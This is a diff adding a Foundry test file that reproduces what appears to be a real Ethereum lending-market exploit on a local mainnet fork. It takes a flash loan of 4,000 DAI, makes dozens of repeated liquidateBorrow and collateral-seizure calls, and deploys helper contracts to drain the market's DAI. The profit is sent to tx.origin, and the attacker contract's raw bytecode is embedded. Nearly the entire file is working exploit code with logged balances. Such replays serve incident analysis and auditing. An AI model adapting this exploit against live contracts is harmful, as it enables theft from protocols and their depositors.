@@ -1,0 +1,1027 @@
+// SPDX-License-Identifier: UNLICENSED
+pragma solidity ^0.8.13;
+
+import "forge-std/Test.sol";
+
+interface IERC20 {
+    function balanceOf(address) external view returns (uint256);
+}
+
+// https://explorer.phalcon.xyz/tx/eth/0x325999373f1aae98db2d89662ff1afbe0c842736f7564d16a7b52bf5c777d3a4
+// https://etherscan.io/address/0x9B99d7ce9E39c68aB93348fd31FD4C99f79E4B19
+
+struct S1 {
+    S2 p1;
+    address p2;
+    uint256 p3;
+}
+
+struct S2 {
+    address p1;
+    uint160 p2;
+    uint48 p3;
+    uint48 p4;
+}
+
+interface I {
+    function mint(uint256) external payable;
+    function redeemUnderlying(uint256) external payable;
+    function borrowBalanceStored(address) external payable;
+    function underlying() external payable;
+    function balanceOf(address) external payable returns (uint256);
+    function borrow(uint256) external payable;
+    function approve(address, uint256) external payable;
+    function enterMarkets(address[] memory) external payable;
+    function liquidateCalculateSeizeTokens(address, address, uint256) external payable;
+    function execute(bytes memory, bytes[] memory, uint256) external payable;
+    function flashLoan(address, address[] memory, uint256[] memory, bytes memory) external payable;
+    function transfer(address, uint256) external payable;
+    function start(address, address, address) external payable;
+    function redeem(uint256) external payable;
+    function liquidateBorrow(address, uint256, address) external payable;
+}
+
+contract Xa6d3 is Test {
+    address immutable r = address(this);
+    receive() external payable {}
+
+    function setUp() public pure {
+        console2.log("0x325999373f1aae98db2d89662ff1afbe0c842736f7564d16a7b52bf5c777d3a4");
+    }
+
+    address constant x22d4 = 0x000000000022D473030F116dDEE9F6B43aC78BA3;
+    address constant x37a8 = 0x37a8f295612602f2774d331e562be9e61B83a327;
+    address constant x3cf7 = 0x3cF7e9d9dCfeD77f295CF7A7F5539eC407D9a67d;
+    address constant x3fc9 = 0x3fC91A3afd70395Cd496C647d5a6CC9D4B2b7FAD;
+    address constant x636f = 0x000000000000000000636F6e736F6c652e6c6f67;
+    address constant x6b17 = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
+    address constant x959f = 0x959Fb43EF08F415da0AeA39BEEf92D96f41E41b3;
+    address constant xba12 = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
+    address constant xc02a = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
+    address constant xdac1 = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
+    address constant xe5c6 = 0xE5C6c14F466A4F3A73eCEc7F3aAaA15c5EcBc769;
+    address constant xf514 = 0xf5140fC35C6f94D02d7466f793fEB0216082d7E5;
+    address constant xf573 = 0xf573E6740045b5387F6d36a26B102C2adF639af5;
+    address constant xffff = 0xFFfFfFffFFfffFFfFFfFFFFFffFFFffffFfFFFfF;
+
+    address x7605;
+    address x3d0e;
+    address x8619;
+    address xbf9c;
+    address x53d8;
+    address x0b63;
+    address x547d;
+    address x3a36;
+    address x58de;
+    address x8cbb;
+
+    function test1() public {
+        vm.createSelectFork("http://localhost:18545", 18385885); // tx.blockNumber - 1
+        // vm.createSelectFork("http://localhost:18545", bytes32(0xf6233627ae77f34d54d2b81334d6bccac9d3964f6729f558c5a8cc89207e4f89));
+
+        // https://explorer.phalcon.xyz/tx/eth/0xf6233627ae77f34d54d2b81334d6bccac9d3964f6729f558c5a8cc89207e4f89
+        this.xf6233627();
+        // https://explorer.phalcon.xyz/tx/eth/0x194e2f121e441275ad03a8e4946acba7dc32ef05a82c3d7b331cab6523256fc6
+        this.x194e2f12();
+        // https://explorer.phalcon.xyz/tx/eth/0xea24eb382ab5ee912b1cd9dbd775c7026f4330b94530b7732f9845a75dfaeffd
+        this.xea24eb38();
+        // https://explorer.phalcon.xyz/tx/eth/0x06582f73282eee483dd93a36e4d2d7abca80eb2bfff9f8b15d1467ad239866fb
+        this.x06582f73();
+        address[] memory arr02 = new address[](1);
+        arr02[0] = x6b17;
+        uint256[] memory arr03 = new uint256[](1);
+        arr03[0] = 4000000000000000000000;
+        // https://explorer.phalcon.xyz/tx/eth/0x325999373f1aae98db2d89662ff1afbe0c842736f7564d16a7b52bf5c777d3a4
+        start(arr02, arr03);
+    }
+
+    function test2() public {
+        vm.createSelectFork("http://localhost:18545", 18383597); // tx.blockNumber - 1
+        // https://explorer.phalcon.xyz/tx/eth/0xf6233627ae77f34d54d2b81334d6bccac9d3964f6729f558c5a8cc89207e4f89
+        this.xf6233627();
+        vm.warp(1697718443);
+        vm.roll(18384371);
+        // https://explorer.phalcon.xyz/tx/eth/0x194e2f121e441275ad03a8e4946acba7dc32ef05a82c3d7b331cab6523256fc6
+        this.x194e2f12();
+        vm.warp(1697734907);
+        vm.roll(18385734);
+        // https://explorer.phalcon.xyz/tx/eth/0xea24eb382ab5ee912b1cd9dbd775c7026f4330b94530b7732f9845a75dfaeffd
+        this.xea24eb38();
+        vm.warp(1697734955);
+        vm.roll(18385738);
+        // https://explorer.phalcon.xyz/tx/eth/0x06582f73282eee483dd93a36e4d2d7abca80eb2bfff9f8b15d1467ad239866fb
+        this.x06582f73();
+        vm.warp(1697736719);
+        vm.roll(18385885);
+        address[] memory arr02 = new address[](1);
+        arr02[0] = x6b17;
+        uint256[] memory arr03 = new uint256[](1);
+        arr03[0] = 4000000000000000000000;
+        // https://explorer.phalcon.xyz/tx/eth/0x325999373f1aae98db2d89662ff1afbe0c842736f7564d16a7b52bf5c777d3a4
+        start(arr02, arr03);
+    }
+
+    function test3() public {
+        vm.createSelectFork("http://localhost:18545", 18385885); // tx.blockNumber - 1
+
+        address RECEIVER = address(this);
+        vm.warp(1697736719);
+        vm.roll(18385886);
+        vm.deal(RECEIVER, 10 ether);
+        vm.store(
+            address(0x6B175474E89094C44Da98b954EedeAC495271d0F),
+            keccak256(abi.encode(RECEIVER, uint256(2))),
+            bytes32(uint256(1000000000000000000000000))
+        );
+        vm.store(
+            address(0xdAC17F958D2ee523a2206206994597C13D831ec7),
+            keccak256(abi.encode(RECEIVER, uint256(2))),
+            bytes32(uint256(1000000000000000000000000))
+        );
+        vm.store(
+            address(0xf5140fC35C6f94D02d7466f793fEB0216082d7E5),
+            keccak256(abi.encode(RECEIVER, uint256(14))),
+            bytes32(uint256(1000000000000000000000000))
+        );
+        vm.store(
+            address(0xf573E6740045b5387F6d36a26B102C2adF639af5),
+            keccak256(abi.encode(RECEIVER, uint256(0))),
+            bytes32(uint256(1000000000000000000000000))
+        );
+        address[] memory arr02 = new address[](1);
+        arr02[0] = x6b17;
+        uint256[] memory arr03 = new uint256[](1);
+        arr03[0] = 4000000000000000000000;
+        // https://explorer.phalcon.xyz/tx/eth/0x325999373f1aae98db2d89662ff1afbe0c842736f7564d16a7b52bf5c777d3a4
+        start(arr02, arr03);
+    }
+
+    function start(address[] memory, uint256[] memory) public {
+        address[] memory arr04 = new address[](1);
+        arr04[0] = x6b17;
+        uint256[] memory arr05 = new uint256[](1);
+        arr05[0] = 4000000000000000000000;
+        I(xba12).flashLoan(r, arr04, arr05, "");
+    }
+
+    function x194e2f12() public {
+        _constructor_();
+    }
+
+    function xf6233627() public {
+        x7605 = address(new X7605());
+    }
+
+    function x06582f73() public {
+        bytes memory b01 = abi.encode(
+            xdac1,
+            xffff,
+            1700326925,
+            0,
+            x3fc9,
+            1697736725,
+            224,
+            65,
+            hex"54640ff4015f7054c24b1f7b9acc5c0b3cee9d9bff9b089e01407652e44bccef1d3ce3f47dfb1f4f9c6deb8b42345fb383a02eb4bc2a065a8e84ab07186544bb1b00000000000000000000000000000000000000000000000000000000000000"
+        );
+        bytes memory b02 = abi.encode(2, 176500000, 109098160524109318, 160, 1, 2, xdac1, xc02a);
+        bytes memory b03 = abi.encode(xc02a, x37a8, 15);
+        bytes memory b04 = abi.encode(1, 108934513283323154);
+        bytes[] memory arr01 = new bytes[](4);
+        arr01[0] = b01;
+        arr01[1] = b02;
+        arr01[2] = b03;
+        arr01[3] = b04;
+        I(x3fc9).execute(hex"0a08060c", arr01, 1697735519);
+    }
+
+    function xea24eb38() public {
+        I(xdac1).approve(x22d4, type(uint256).max);
+    }
+
+    function receiveFlashLoan(address[] memory, uint256[] memory, uint256[] memory, bytes memory) public {
+        I(x6b17).approve(xe5c6, type(uint256).max);
+        I(xe5c6).borrowBalanceStored(x3cf7);
+        I(x959f).liquidateCalculateSeizeTokens(xe5c6, xf514, 348612990828363763381);
+        // uint256 v1 = 16500000000000;
+        uint256 v1 = I(xf514).balanceOf(x3cf7);
+        console2.log("I(xf514).balanceOf(x3cf7)\t->", uint256(16500000000000));
+        I(xe5c6).liquidateBorrow(x3cf7, 348612990828363763381, xf514);
+        I(xe5c6).borrowBalanceStored(x3cf7);
+        I(x959f).liquidateCalculateSeizeTokens(xe5c6, xf514, 314565542000190843791);
+        // uint256 v2 = 14756935045859;
+        uint256 v2 = I(xf514).balanceOf(x3cf7);
+        console2.log("I(xf514).balanceOf(x3cf7)\t->", uint256(14756935045859));
+        I(xe5c6).liquidateBorrow(x3cf7, 314565542000190843791, xf514);
+        I(xe5c6).borrowBalanceStored(x3cf7);
+        I(x959f).liquidateCalculateSeizeTokens(xe5c6, xf514, 283108987800171759412);
+        // uint256 v3 = 13184107335859;
+        uint256 v3 = I(xf514).balanceOf(x3cf7);
+        console2.log("I(xf514).balanceOf(x3cf7)\t->", uint256(13184107335859));
+        I(xe5c6).liquidateBorrow(x3cf7, 283108987800171759412, xf514);
+        I(xe5c6).borrowBalanceStored(x3cf7);
+        I(x959f).liquidateCalculateSeizeTokens(xe5c6, xf514, 254798089020154583470);
+        // uint256 v4 = 11768562396859;
+        uint256 v4 = I(xf514).balanceOf(x3cf7);
+        console2.log("I(xf514).balanceOf(x3cf7)\t->", uint256(11768562396859));
+        I(xe5c6).liquidateBorrow(x3cf7, 254798089020154583470, xf514);
+        I(xe5c6).borrowBalanceStored(x3cf7);
+        I(x959f).liquidateCalculateSeizeTokens(xe5c6, xf514, 229318280118139125123);
+        // uint256 v5 = 10494571951759;
+        uint256 v5 = I(xf514).balanceOf(x3cf7);
+        console2.log("I(xf514).balanceOf(x3cf7)\t->", uint256(10494571951759));
+        I(xe5c6).liquidateBorrow(x3cf7, 229318280118139125123, xf514);
+        I(xe5c6).borrowBalanceStored(x3cf7);
+        I(x959f).liquidateCalculateSeizeTokens(xe5c6, xf514, 206386452106325212611);
+        // uint256 v6 = 9347980551169;
+        uint256 v6 = I(xf514).balanceOf(x3cf7);
+        console2.log("I(xf514).balanceOf(x3cf7)\t->", uint256(9347980551169));
+        I(xe5c6).liquidateBorrow(x3cf7, 206386452106325212611, xf514);
+        I(xe5c6).borrowBalanceStored(x3cf7);
+        I(x959f).liquidateCalculateSeizeTokens(xe5c6, xf514, 185747806895692691350);
+        // uint256 v7 = 8316048290638;
+        uint256 v7 = I(xf514).balanceOf(x3cf7);
+        console2.log("I(xf514).balanceOf(x3cf7)\t->", uint256(8316048290638));
+        I(xe5c6).liquidateBorrow(x3cf7, 185747806895692691350, xf514);
+        I(xe5c6).borrowBalanceStored(x3cf7);
+        {
+            I(x959f).liquidateCalculateSeizeTokens(xe5c6, xf514, 167173026206123422215);
+            // uint256 v8 = 7387309256160;
+            uint256 v8 = I(xf514).balanceOf(x3cf7);
+            console2.log("I(xf514).balanceOf(x3cf7)\t->", uint256(7387309256160));
+            I(xe5c6).liquidateBorrow(x3cf7, 167173026206123422215, xf514);
+            I(xe5c6).borrowBalanceStored(x3cf7);
+            I(x959f).liquidateCalculateSeizeTokens(xe5c6, xf514, 150455723585511079993);
+            // uint256 v9 = 6551444125130;
+            uint256 v9 = I(xf514).balanceOf(x3cf7);
+            console2.log("I(xf514).balanceOf(x3cf7)\t->", uint256(6551444125130));
+            I(xe5c6).liquidateBorrow(x3cf7, 150455723585511079993, xf514);
+            I(xe5c6).borrowBalanceStored(x3cf7);
+            I(x959f).liquidateCalculateSeizeTokens(xe5c6, xf514, 135410151226959971994);
+            // uint256 v10 = 5799165507203;
+            uint256 v10 = I(xf514).balanceOf(x3cf7);
+            console2.log("I(xf514).balanceOf(x3cf7)\t->", uint256(5799165507203));
+            I(xe5c6).liquidateBorrow(x3cf7, 135410151226959971994, xf514);
+            I(xe5c6).borrowBalanceStored(x3cf7);
+            I(x959f).liquidateCalculateSeizeTokens(xe5c6, xf514, 121869136104263974795);
+            // uint256 v11 = 5122114751069;
+            uint256 v11 = I(xf514).balanceOf(x3cf7);
+            console2.log("I(xf514).balanceOf(x3cf7)\t->", uint256(5122114751069));
+            I(xe5c6).liquidateBorrow(x3cf7, 121869136104263974795, xf514);
+            I(xe5c6).borrowBalanceStored(x3cf7);
+            I(x959f).liquidateCalculateSeizeTokens(xe5c6, xf514, 109682222493837577315);
+            // uint256 v12 = 4512769070548;
+            uint256 v12 = I(xf514).balanceOf(x3cf7);
+            console2.log("I(xf514).balanceOf(x3cf7)\t->", uint256(4512769070548));
+            I(xe5c6).liquidateBorrow(x3cf7, 109682222493837577315, xf514);
+            I(xe5c6).borrowBalanceStored(x3cf7);
+            I(x959f).liquidateCalculateSeizeTokens(xe5c6, xf514, 98714000244453819584);
+            // uint256 v13 = 3964357958079;
+            uint256 v13 = I(xf514).balanceOf(x3cf7);
+            console2.log("I(xf514).balanceOf(x3cf7)\t->", uint256(3964357958079));
+            I(xe5c6).liquidateBorrow(x3cf7, 98714000244453819584, xf514);
+            I(xe5c6).borrowBalanceStored(x3cf7);
+            I(x959f).liquidateCalculateSeizeTokens(xe5c6, xf514, 88842600220008437625);
+            // uint256 v14 = 3470787956857;
+            uint256 v14 = I(xf514).balanceOf(x3cf7);
+            console2.log("I(xf514).balanceOf(x3cf7)\t->", uint256(3470787956857));
+            I(xe5c6).liquidateBorrow(x3cf7, 88842600220008437625, xf514);
+            I(xe5c6).borrowBalanceStored(x3cf7);
+            I(x959f).liquidateCalculateSeizeTokens(xe5c6, xf514, 79958340198007593863);
+            // uint256 v15 = 3026574955757;
+            uint256 v15 = I(xf514).balanceOf(x3cf7);
+            console2.log("I(xf514).balanceOf(x3cf7)\t->", uint256(3026574955757));
+        }
+        {
+            I(xe5c6).liquidateBorrow(x3cf7, 79958340198007593863, xf514);
+            I(xe5c6).borrowBalanceStored(x3cf7);
+            I(x959f).liquidateCalculateSeizeTokens(xe5c6, xf514, 71962506178206834477);
+            // uint256 v16 = 2626783254767;
+            uint256 v16 = I(xf514).balanceOf(x3cf7);
+            console2.log("I(xf514).balanceOf(x3cf7)\t->", uint256(2626783254767));
+            I(xe5c6).liquidateBorrow(x3cf7, 71962506178206834477, xf514);
+            I(xe5c6).borrowBalanceStored(x3cf7);
+            I(x959f).liquidateCalculateSeizeTokens(xe5c6, xf514, 64766255560386151029);
+            // uint256 v17 = 2266970723876;
+            uint256 v17 = I(xf514).balanceOf(x3cf7);
+            console2.log("I(xf514).balanceOf(x3cf7)\t->", uint256(2266970723876));
+            I(xe5c6).liquidateBorrow(x3cf7, 64766255560386151029, xf514);
+            I(xe5c6).borrowBalanceStored(x3cf7);
+            I(x959f).liquidateCalculateSeizeTokens(xe5c6, xf514, 58289630004347535926);
+            // uint256 v18 = 1943139446075;
+            uint256 v18 = I(xf514).balanceOf(x3cf7);
+            console2.log("I(xf514).balanceOf(x3cf7)\t->", uint256(1943139446075));
+            I(xe5c6).liquidateBorrow(x3cf7, 58289630004347535926, xf514);
+            I(xe5c6).borrowBalanceStored(x3cf7);
+            I(x959f).liquidateCalculateSeizeTokens(xe5c6, xf514, 52460667003912782333);
+            // uint256 v19 = 1651691296054;
+            uint256 v19 = I(xf514).balanceOf(x3cf7);
+            console2.log("I(xf514).balanceOf(x3cf7)\t->", uint256(1651691296054));
+            I(xe5c6).liquidateBorrow(x3cf7, 52460667003912782333, xf514);
+            I(xe5c6).borrowBalanceStored(x3cf7);
+            I(x959f).liquidateCalculateSeizeTokens(xe5c6, xf514, 47214600303521504100);
+            // uint256 v20 = 1389387961035;
+            uint256 v20 = I(xf514).balanceOf(x3cf7);
+            console2.log("I(xf514).balanceOf(x3cf7)\t->", uint256(1389387961035));
+            I(xe5c6).liquidateBorrow(x3cf7, 47214600303521504100, xf514);
+            I(xe5c6).borrowBalanceStored(x3cf7);
+            I(x959f).liquidateCalculateSeizeTokens(xe5c6, xf514, 42493140273169353690);
+            // uint256 v21 = 1153314959518;
+            uint256 v21 = I(xf514).balanceOf(x3cf7);
+            console2.log("I(xf514).balanceOf(x3cf7)\t->", uint256(1153314959518));
+            I(xe5c6).liquidateBorrow(x3cf7, 42493140273169353690, xf514);
+            I(xe5c6).borrowBalanceStored(x3cf7);
+            I(x959f).liquidateCalculateSeizeTokens(xe5c6, xf514, 38243826245852418321);
+            // uint256 v22 = 940849258153;
+            uint256 v22 = I(xf514).balanceOf(x3cf7);
+            console2.log("I(xf514).balanceOf(x3cf7)\t->", uint256(940849258153));
+            I(xe5c6).liquidateBorrow(x3cf7, 38243826245852418321, xf514);
+            I(xe5c6).borrowBalanceStored(x3cf7);
+        }
+        {
+            I(x959f).liquidateCalculateSeizeTokens(xe5c6, xf514, 34419443621267176489);
+            // uint256 v23 = 749630126924;
+            uint256 v23 = I(xf514).balanceOf(x3cf7);
+            console2.log("I(xf514).balanceOf(x3cf7)\t->", uint256(749630126924));
+            I(xe5c6).liquidateBorrow(x3cf7, 34419443621267176489, xf514);
+            I(xe5c6).borrowBalanceStored(x3cf7);
+            I(x959f).liquidateCalculateSeizeTokens(xe5c6, xf514, 30977499259140458840);
+            // uint256 v24 = 577532908818;
+            uint256 v24 = I(xf514).balanceOf(x3cf7);
+            console2.log("I(xf514).balanceOf(x3cf7)\t->", uint256(577532908818));
+            I(xe5c6).liquidateBorrow(x3cf7, 30977499259140458840, xf514);
+            I(xe5c6).borrowBalanceStored(x3cf7);
+            I(x959f).liquidateCalculateSeizeTokens(xe5c6, xf514, 27879749333226412956);
+            // uint256 v25 = 422645412523;
+            uint256 v25 = I(xf514).balanceOf(x3cf7);
+            console2.log("I(xf514).balanceOf(x3cf7)\t->", uint256(422645412523));
+            I(xe5c6).liquidateBorrow(x3cf7, 27879749333226412956, xf514);
+            I(xe5c6).borrowBalanceStored(x3cf7);
+            I(x959f).liquidateCalculateSeizeTokens(xe5c6, xf514, 25091774399903771660);
+            // uint256 v26 = 283246665857;
+            uint256 v26 = I(xf514).balanceOf(x3cf7);
+            console2.log("I(xf514).balanceOf(x3cf7)\t->", uint256(283246665857));
+            I(xe5c6).liquidateBorrow(x3cf7, 25091774399903771660, xf514);
+            I(xe5c6).borrowBalanceStored(x3cf7);
+            I(x959f).liquidateCalculateSeizeTokens(xe5c6, xf514, 22582596959913394494);
+            // uint256 v27 = 157787793858;
+            uint256 v27 = I(xf514).balanceOf(x3cf7);
+            console2.log("I(xf514).balanceOf(x3cf7)\t->", uint256(157787793858));
+            I(xe5c6).liquidateBorrow(x3cf7, 22582596959913394494, xf514);
+            I(xe5c6).borrowBalanceStored(x3cf7);
+            I(x959f).liquidateCalculateSeizeTokens(xe5c6, xf514, 20324337263922055045);
+            // uint256 v28 = 44874809059;
+            uint256 v28 = I(xf514).balanceOf(x3cf7);
+            console2.log("I(xf514).balanceOf(x3cf7)\t->", uint256(44874809059));
+            I(xe5c6).liquidateBorrow(x3cf7, 8974961811853897913, xf514);
+            // uint256 v29 = 11487514103416337088117;
+            uint256 v29 = I(x6b17).balanceOf(xe5c6);
+            console2.log("I(x6b17).balanceOf(xe5c6)\t->", "11487514103416337088117 (11487.5141 ether)");
+            // uint256 v30 = 16500000000000;
+            uint256 v30 = I(xf514).balanceOf(r);
+            console2.log("I(xf514).balanceOf(r)\t\t->", uint256(16500000000000));
+            I(xf514).redeem(v30);
+            x3d0e = address(new X3d0e(r));
+            // uint256 v31 = 3300000000000000000000;
+            uint256 v31 = I(xf573).balanceOf(r);
+            console2.log("I(xf573).balanceOf(r)\t\t->", "3300000000000000000000 (3300.0 ether)");
+            I(xf573).transfer(x3d0e, v31);
+            I(x3d0e).start(x959f, xf514, xe5c6);
+        }
+        {
+            I(xe5c6).liquidateBorrow(x3d0e, 1, xf514);
+            I(xf514).redeem(1);
+            // uint256 v32 = 10167514103416337088118;
+            uint256 v32 = I(x6b17).balanceOf(xe5c6);
+            console2.log("I(x6b17).balanceOf(xe5c6)\t->", "10167514103416337088118 (10167.5141 ether)");
+            // uint256 v33 = 0;
+            uint256 v33 = I(xf514).balanceOf(r);
+            console2.log("I(xf514).balanceOf(r)\t\t->", uint256(0));
+            I(xf514).redeem(0);
+            x53d8 = address(new X53d8(r));
+            // uint256 v34 = 3300000000000000000000;
+            uint256 v34 = I(xf573).balanceOf(r);
+            console2.log("I(xf573).balanceOf(r)\t\t->", "3300000000000000000000 (3300.0 ether)");
+            I(xf573).transfer(x53d8, v34);
+            I(x53d8).start(x959f, xf514, xe5c6);
+            I(xe5c6).liquidateBorrow(x53d8, 1, xf514);
+            I(xf514).redeem(1);
+            // uint256 v35 = 8847514103416337088119;
+            uint256 v35 = I(x6b17).balanceOf(xe5c6);
+            console2.log("I(x6b17).balanceOf(xe5c6)\t->", "8847514103416337088119 (8847.5141 ether)");
+            // uint256 v36 = 0;
+            uint256 v36 = I(xf514).balanceOf(r);
+            console2.log("I(xf514).balanceOf(r)\t\t->", uint256(0));
+            I(xf514).redeem(0);
+            x3a36 = address(new X3a36(r));
+            // uint256 v37 = 3300000000000000000000;
+            uint256 v37 = I(xf573).balanceOf(r);
+            console2.log("I(xf573).balanceOf(r)\t\t->", "3300000000000000000000 (3300.0 ether)");
+            I(xf573).transfer(x3a36, v37);
+            I(x3a36).start(x959f, xf514, xe5c6);
+            I(xe5c6).liquidateBorrow(x3a36, 1, xf514);
+            I(xf514).redeem(1);
+            // uint256 v38 = 7527514103416337088120;
+            uint256 v38 = I(x6b17).balanceOf(xe5c6);
+            console2.log("I(x6b17).balanceOf(xe5c6)\t->", "7527514103416337088120 (7527.5141 ether)");
+            // uint256 v39 = 0;
+            uint256 v39 = I(xf514).balanceOf(r);
+            console2.log("I(xf514).balanceOf(r)\t\t->", uint256(0));
+            I(xf514).redeem(0);
+            xbf9c = address(new Xbf9c(r));
+            // uint256 v40 = 3300000000000000000000;
+            uint256 v40 = I(xf573).balanceOf(r);
+            console2.log("I(xf573).balanceOf(r)\t\t->", "3300000000000000000000 (3300.0 ether)");
+            I(xf573).transfer(xbf9c, v40);
+            I(xbf9c).start(x959f, xf514, xe5c6);
+            I(xe5c6).liquidateBorrow(xbf9c, 1, xf514);
+            I(xf514).redeem(1);
+            // uint256 v41 = 6207514103416337088121;
+            uint256 v41 = I(x6b17).balanceOf(xe5c6);
+            console2.log("I(x6b17).balanceOf(xe5c6)\t->", "6207514103416337088121 (6207.5141 ether)");
+        }
+        {
+            // uint256 v42 = 0;
+            uint256 v42 = I(xf514).balanceOf(r);
+            console2.log("I(xf514).balanceOf(r)\t\t->", uint256(0));
+            I(xf514).redeem(0);
+            x58de = address(new X58de(r));
+            // uint256 v43 = 3300000000000000000000;
+            uint256 v43 = I(xf573).balanceOf(r);
+            console2.log("I(xf573).balanceOf(r)\t\t->", "3300000000000000000000 (3300.0 ether)");
+            I(xf573).transfer(x58de, v43);
+            I(x58de).start(x959f, xf514, xe5c6);
+            I(xe5c6).liquidateBorrow(x58de, 1, xf514);
+            I(xf514).redeem(1);
+            // uint256 v44 = 4887514103416337088122;
+            uint256 v44 = I(x6b17).balanceOf(xe5c6);
+            console2.log("I(x6b17).balanceOf(xe5c6)\t->", "4887514103416337088122 (4887.5141 ether)");
+            // uint256 v45 = 0;
+            uint256 v45 = I(xf514).balanceOf(r);
+            console2.log("I(xf514).balanceOf(r)\t\t->", uint256(0));
+            I(xf514).redeem(0);
+            x8cbb = address(new X8cbb(r));
+            // uint256 v46 = 3300000000000000000000;
+            uint256 v46 = I(xf573).balanceOf(r);
+            console2.log("I(xf573).balanceOf(r)\t\t->", "3300000000000000000000 (3300.0 ether)");
+            I(xf573).transfer(x8cbb, v46);
+            I(x8cbb).start(x959f, xf514, xe5c6);
+            I(xe5c6).liquidateBorrow(x8cbb, 1, xf514);
+            I(xf514).redeem(1);
+            // uint256 v47 = 3567514103416337088123;
+            uint256 v47 = I(x6b17).balanceOf(xe5c6);
+            console2.log("I(x6b17).balanceOf(xe5c6)\t->", "3567514103416337088123 (3567.5141 ether)");
+            // uint256 v48 = 0;
+            uint256 v48 = I(xf514).balanceOf(r);
+            console2.log("I(xf514).balanceOf(r)\t\t->", uint256(0));
+            I(xf514).redeem(0);
+            x0b63 = address(new X0b63(r));
+            // uint256 v49 = 3300000000000000000000;
+            uint256 v49 = I(xf573).balanceOf(r);
+            console2.log("I(xf573).balanceOf(r)\t\t->", "3300000000000000000000 (3300.0 ether)");
+            I(xf573).transfer(x0b63, v49);
+            I(x0b63).start(x959f, xf514, xe5c6);
+            I(xe5c6).liquidateBorrow(x0b63, 1, xf514);
+            I(xf514).redeem(1);
+            // uint256 v50 = 2247514103416337088124;
+            uint256 v50 = I(x6b17).balanceOf(xe5c6);
+            console2.log("I(x6b17).balanceOf(xe5c6)\t->", "2247514103416337088124 (2247.5141 ether)");
+            // uint256 v51 = 0;
+            uint256 v51 = I(xf514).balanceOf(r);
+            console2.log("I(xf514).balanceOf(r)\t\t->", uint256(0));
+            I(xf514).redeem(0);
+            x8619 = address(new X8619(r));
+        }
+        {
+            // uint256 v52 = 3300000000000000000000;
+            uint256 v52 = I(xf573).balanceOf(r);
+            console2.log("I(xf573).balanceOf(r)\t\t->", "3300000000000000000000 (3300.0 ether)");
+            I(xf573).transfer(x8619, v52);
+            I(x8619).start(x959f, xf514, xe5c6);
+            I(xe5c6).liquidateBorrow(x8619, 1, xf514);
+            I(xf514).redeem(1);
+            // uint256 v53 = 927514103416337088125;
+            uint256 v53 = I(x6b17).balanceOf(xe5c6);
+            console2.log("I(x6b17).balanceOf(xe5c6)\t->", "927514103416337088125 (927.5141 ether)");
+            // uint256 v54 = 0;
+            uint256 v54 = I(xf514).balanceOf(r);
+            console2.log("I(xf514).balanceOf(r)\t\t->", uint256(0));
+            I(xf514).redeem(0);
+            x547d = address(new X547d(r));
+            // uint256 v55 = 3300000000000000000000;
+            uint256 v55 = I(xf573).balanceOf(r);
+            console2.log("I(xf573).balanceOf(r)\t\t->", "3300000000000000000000 (3300.0 ether)");
+            I(xf573).transfer(x547d, v55);
+            I(x547d).start(x959f, xf514, xe5c6);
+            I(xe5c6).liquidateBorrow(x547d, 1, xf514);
+            I(xf514).redeem(1);
+            // uint256 v56 = 1;
+            uint256 v56 = I(x6b17).balanceOf(xe5c6);
+            console2.log("I(x6b17).balanceOf(xe5c6)\t->", uint256(1));
+            I(x6b17).transfer(xba12, 4000000000000000000000);
+            // uint256 v57 = 8187514103413431539366;
+            uint256 v57 = I(x6b17).balanceOf(r);
+            console2.log("I(x6b17).balanceOf(r)\t\t->", "8187514103413431539366 (8187.5141 ether)");
+            I(x6b17).transfer(tx.origin, v57);
+        }
+    }
+
+    function _constructor_() public {
+        I(xe5c6).underlying();
+        I(xf514).underlying();
+
+        bytes memory rt =
+            hex"608060405234801561001057600080fd5b50600436106100365760003560e01c80636bb52b311461003b578063f04f270714610050575b600080fd5b61004e610049366004610f17565b610063565b005b61004e61005e366004611049565b6100e3565b60408051600081526020810191829052632e1c224f60e11b90915273ba12222222228d8ba445958a75a0704d566bf2c890635c38449e906100ad90309086908690602481016111a1565b600060405180830381600087803b1580156100c757600080fd5b505af11580156100db573d6000803e3d6000fd5b505050505050565b60405163095ea7b360e01b81526001600160a01b037f000000000000000000000000e5c6c14f466a4f3a73ecec7f3aaaa15c5ecbc7698116600483015260001960248301527f0000000000000000000000006b175474e89094c44da98b954eedeac495271d0f169063095ea7b390604401602060405180830381600087803b15801561016e57600080fd5b505af1158015610182573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906101a69190611248565b506000806000805b6040516395dd919360e01b8152733cf7e9d9dcfed77f295cf7a7f5539ec407d9a67d6004820152600a907f000000000000000000000000e5c6c14f466a4f3a73ecec7f3aaaa15c5ecbc7696001600160a01b0316906395dd91939060240160206040518083038186803b15801561022457600080fd5b505afa158015610238573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061025c9190611271565b61026691906112a0565b60405163c488847b60e01b81526001600160a01b037f000000000000000000000000e5c6c14f466a4f3a73ecec7f3aaaa15c5ecbc769811660048301527f000000000000000000000000f5140fc35c6f94d02d7466f793feb0216082d7e581166024830152604482018390529194507f000000000000000000000000959fb43ef08f415da0aea39beef92d96f41e41b39091169063c488847b90606401604080518083038186803b15801561031a57600080fd5b505afa15801561032e573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061035291906112c2565b6040516370a0823160e01b8152733cf7e9d9dcfed77f295cf7a7f5539ec407d9a67d60048201529095507f000000000000000000000000f5140fc35c6f94d02d7466f793feb0216082d7e56001600160a01b031691506370a082319060240160206040518083038186803b1580156103c957600080fd5b505afa1580156103dd573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906104019190611271565b915081841115610410576104ff565b604051637af1e23160e11b8152733cf7e9d9dcfed77f295cf7a7f5539ec407d9a67d6004820152602481018490526001600160a01b037f000000000000000000000000f5140fc35c6f94d02d7466f793feb0216082d7e5811660448301527f000000000000000000000000e5c6c14f466a4f3a73ecec7f3aaaa15c5ecbc769169063f5e3c46290606401602060405180830381600087803b1580156104b457600080fd5b505af11580156104c8573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906104ec9190611271565b50806104f7816112e6565b9150506101ae565b508261050b8284611301565b61051591906112a0565b604051637af1e23160e11b8152733cf7e9d9dcfed77f295cf7a7f5539ec407d9a67d6004820152602481018290526001600160a01b037f000000000000000000000000f5140fc35c6f94d02d7466f793feb0216082d7e5811660448301529193507f000000000000000000000000e5c6c14f466a4f3a73ecec7f3aaaa15c5ecbc7699091169063f5e3c462906064016020604